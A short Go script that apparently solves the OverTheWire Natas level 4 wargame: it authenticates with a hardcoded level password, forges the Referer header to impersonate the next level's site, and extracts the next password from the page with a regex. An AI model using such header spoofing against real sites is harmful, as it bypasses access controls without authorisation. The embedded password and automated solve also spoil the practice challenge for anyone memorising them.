package main

import (
	"fmt"
	"net/http"
	"io/ioutil"
	"regexp"
	"strings"
)

var (
	username = "natas4"
	password = "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm"
	url = "http://natas4.natas.labs.overthewire.org" 
)

func main (){
	request, _ := http.NewRequest("GET", url, nil)

	request.SetBasicAuth(username, password)
	request.Header.Set("Referer", "http://natas5.natas.labs.overthewire.org/")
	response, _ := http.DefaultClient.Do(request)
	defer response.Body.Close()	

	content ,_ := ioutil.ReadAll(response.Body)
	// fmt.Println(string(content))
	regex := regexp.MustCompile(`The password for natas(.*)`)
	almost := strings.Split(regex.FindAllString(string(content), 1)[0], " ")
	answer := almost[len(almost) - 1]
	fmt.Println(answer)
}